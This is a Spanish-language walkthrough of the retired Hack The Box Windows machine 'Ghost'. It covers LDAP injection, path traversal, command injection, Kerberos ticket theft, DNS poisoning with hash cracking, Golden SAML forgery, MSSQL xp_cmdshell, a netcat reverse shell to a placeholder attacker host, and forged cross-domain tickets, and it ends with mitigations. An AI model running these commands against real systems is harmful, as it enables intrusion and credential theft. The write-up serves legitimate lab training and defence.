---
machine: Ghost
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, active-directory, ldap, adfs, golden-saml, kerberos, mssql, privesc]
---

# Ghost — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Ghost es un DC con un Linux auxiliar que publica un blog Ghost y una intranet Next.js. La intranet autentica por LDAP y es vulnerable a inyección LDAP: `*` entra como `kathryn.holland`. Desde dentro se descubre Gitea y un repositorio con el código fuente: el blog tiene una lectura de archivos en `extra` y la intranet una inyección de comandos en `/api-dev/scan`, protegida por `X-DEV-INTRANET-KEY`. Se lee `/proc/self/environ` para obtener la clave, se ejecuta como root en el contenedor y se reutiliza un socket SSH multiplexado para entrar en `LINUX-DEV-WS01` como `florence.ramirez`. Se extrae su TGT, se añade un registro DNS `bitbucket` para capturar el NetNTLMv2 de `justin.bradley`, se craquea y se obtiene WinRM. `justin.bradley` puede leer la contraseña gMSA de `adfs_gmsa$`; con esa cuenta se vuelca el material de firma de ADFS y se forja un Golden SAML como `Administrator`. El portal SQL permite `OPENQUERY` a `PRIMARY`, impersonar `sa`, habilitar `xp_cmdshell` y obtener `mssqlserver`; `EfsPotato` da SYSTEM. Al ser un DC de `corp.ghost.htb` con trust bidireccional, un ticket de confianza forjado o un Golden Ticket con Enterprise Admins permite leer la flag final en `DC01`.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389 <IP>
```

- DC `DC01.ghost.htb`, dominio `ghost.htb`, Windows Server 2022.
- `8008` nginx/Ubuntu con Ghost 5.78 y `intranet.ghost.htb` (Next.js).
- `8443` Ghost Core, login SAML contra `federation.ghost.htb`.
- `1433` MSSQL 2022; `5985` WinRM; `3389` RDP.

```text
10.10.11.24 DC01 DC01.ghost.htb ghost.htb intranet.ghost.htb \
  gitea.ghost.htb federation.ghost.htb
```

## Enumeración

`intranet.ghost.htb` usa LDAP. El formulario envía `ldap-username` y `ldap-secret`; probar `*` en ambos autentica como `kathryn.holland`. El panel lista usuarios y grupos, habla de una migración de Gitea a Bitbucket y de `gitea_temp_principal`.

```bash
kerbrute userenum -d ghost.htb users.txt --dc dc01.ghost.htb
```

El blog expone `/ghost/api/content/posts/?key=<KEY>`. El repositorio `ghost-dev/blog` contiene un `posts-public.js` modificado: si se pasa `extra`, lee `/var/lib/ghost/extra/<extra>` sin sanear. El repositorio `gohst-dev/intranet` contiene el frontend Next.js y el backend Rust con `/scan`, que ejecuta `bash -c "intranet_url_check <url>"`.

## Foothold

La inyección LDAP permite fuerza bruta de contraseñas por prefijo: se envía `<prefijo>*` y un 303 confirma el carácter. Así se obtiene la contraseña de `gitea_temp_principal`.

La lectura de archivos del blog permite traversal:

```bash
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=<KEY>&extra=../../../../etc/passwd' -s \
  | jq -r '.meta.extra["../../../../etc/passwd"]'
```

Se lee `/proc/self/environ` y aparece `DEV_INTRANET_KEY`. Con ella se llama al endpoint de la intranet:

```bash
curl http://intranet.ghost.htb:8008/api-dev/scan \
  -H 'Content-Type: application/json' \
  -H 'X-DEV-INTRANET-KEY: <KEY>' \
  -d '{"url":"http://<ATTACKER>/; id"}'
```

La salida de `id` vuelve en `temp_command_stdout` como `uid=0(root)`. Se sustituye por una reverse shell bash y se obtiene root en el contenedor.

## Movimiento lateral

El contenedor tiene `docker-entrypoint.sh`, que configura SSH multiplexado en `/root/.ssh/controlmaster`. Existe un socket persistente como `florence.ramirez@ghost.htb@dev-workstation:22`; se reutiliza sin credenciales:

```bash
ssh -o ControlPath=/root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 \
  florence.ramirez@ghost.htb@dev-workstation
```

En `LINUX-DEV-WS01`, `klist` muestra un TGT en `/tmp/krb5cc_50`. Se copia en base64, se decodifica en el atacante y se usa con `KRB5CCNAME`:

```bash
KRB5CCNAME=florence.ramirez.krb5cc netexec smb ghost.htb --use-kcache
```

`justin.bradley` comenta que su script de Bitbucket falla porque falta el DNS. Cualquier usuario de dominio puede crear registros DNS; se añade `bitbucket.ghost.htb` apuntando al atacante y Responder captura su NetNTLMv2:

```bash
python dnstool.py -u 'ghost.htb\florence.ramirez' -k -a add -r bitbucket \
  --zone ghost.htb --data <ATTACKER> -dns-ip <IP> DC01.ghost.htb
hashcat -m 5600 justin.netntlmv2 rockyou.txt
```

La contraseña craqueada funciona en WinRM y da `user.txt`.

## Escalada de privilegios

`justin.bradley` puede leer la contraseña gMSA de `adfs_gmsa$`, que también tiene WinRM:

```bash
netexec ldap dc01.ghost.htb -u justin.bradley -p '<PASSWORD>' --gmsa
evil-winrm -i dc01.ghost.htb -u 'adfs_gmsa$' -H '<NTLM>'
```

Se ejecuta `ADFSDump.exe` y se obtienen la clave privada, la clave de firma cifrada, el issuer y el relying party de `core.ghost.htb:8443`. Con `ADFSpoof.py` se forja un `SAMLResponse` como `Administrator@ghost.htb` y se envía a `/adfs/saml/postResponse`; la cookie resultante abre el portal SQL.

El portal conecta como `web_client` y tiene un linked server `PRIMARY`. `OPENQUERY` permite ejecutar allí; `bridge_corp` puede impersonar a `sa`:

```sql
EXECUTE('EXECUTE AS LOGIN=''sa''; exec sp_configure "show advanced options",1; reconfigure;') AT [PRIMARY]
EXECUTE('EXECUTE AS LOGIN=''sa''; exec sp_configure "xp_cmdshell",1; reconfigure;') AT [PRIMARY]
EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell "whoami"') AT [PRIMARY]
```

Se descarga `nc64.exe` y se lanza una reverse shell como `NT SERVICE\MSSQLSERVER`. Ese servicio tiene `SeImpersonate`; GodPotato es bloqueado por Defender, así que se compila `EfsPotato.cs` con `csc.exe` y se ejecuta:

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
.\EfsPotato.exe '\programdata\nc64.exe <ATTACKER> 444 -e powershell'
```

La shell es `nt authority\system` en `PRIMARY`, DC de `corp.ghost.htb`.

### Cruzar el trust

`PRIMARY` es DC de `corp.ghost.htb`, con trust bidireccional within-forest hacia `ghost.htb`. Con SYSTEM se vuelca el hash de la cuenta de confianza `GHOST$` y el SID del dominio, y se forja un ticket interdominio:

```bash
ticketer.py -nthash <TRUST_HASH> \
  -domain-sid <CORP_SID> -domain corp.ghost.htb \
  -extra-sid <GHOST_ENTERPRISE_ADMINS_SID> \
  -spn krbtgt/ghost.htb 0xdf
getST.py -k -no-pass -spn cifs/dc01.ghost.htb corp.ghost.htb/0xdf@ghost.htb
```

Con el service ticket se accede a `C$` de `DC01` y se lee `root.txt`. Alternativa: Golden Ticket con el hash de `krbtgt` de `corp.ghost.htb` y `/sids:<GHOST_ENTERPRISE_ADMINS_SID>`.

## Evidencia

- Login LDAP con `*` como `kathryn.holland`.
- Contraseña de `gitea_temp_principal` recuperada por prefijo.
- `extra=../../../../etc/passwd` y `DEV_INTRANET_KEY` desde `/proc/self/environ`.
- `id` como root en `temp_command_stdout`.
- Socket SSH multiplexado y TGT de `florence.ramirez`.
- Registro DNS `bitbucket` y hash NetNTLMv2 de `justin.bradley`.
- gMSA de `adfs_gmsa$`, `ADFSDump` y Golden SAML.
- `OPENQUERY`, `xp_cmdshell`, `EfsPotato` y SYSTEM en `PRIMARY`.
- Ticket de confianza y lectura de `root.txt` en `DC01`.

## Lecciones aprendidas

- La inyección LDAP en un login permite bypass y extracción de atributos por prefijo.
- Los repositorios internos exponen contratos, claves y vulnerabilidades del backend.
- La lectura de archivos en `/proc/self/environ` filtra secretos del proceso.
- SSH multiplexado reutiliza autenticaciones y salta controles de acceso.
- Cualquier usuario de dominio puede crear registros DNS; Responder convierte eso en credenciales.
- ADFS sin protección de su material de firma permite forjar identidades arbitrarias.
- Un linked server con `IMPERSONATE` y `xp_cmdshell` lleva de SQL a RCE.
- Los trusts within-forest permiten reutilizar SIDs de Enterprise Admins.

## Mitigaciones y detección

- Parametrizar las búsquedas LDAP y rechazar metacaracteres en el login.
- No guardar secretos en variables de entorno de procesos accesibles por lectura de archivos.
- Revisar el código de plugins y APIs internas; validar rutas y comandos.
- Deshabilitar la creación de registros DNS por usuarios y habilitar LDAP signing/channel binding.
- Proteger las claves de ADFS, rotar material comprometido y monitorizar `ADFSDump` y SAML anómalo.
- Restringir `IMPERSONATE`, `xp_cmdshell` y linked servers; segregar la cuenta SQL.
- Auditar trusts, tickets forjados y accesos `C$` entre dominios.

## Referencias

- [0xdf — Ghost](https://0xdf.gitlab.io/2025/04/05/htb-ghost.html)
- [IppSec — Ghost](https://www.youtube.com/watch?v=4dEmocjKnZg)
- [Hack The Box — Ghost](https://app.hackthebox.com/machines/ghost)
- [Microsoft — ADFS](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview)
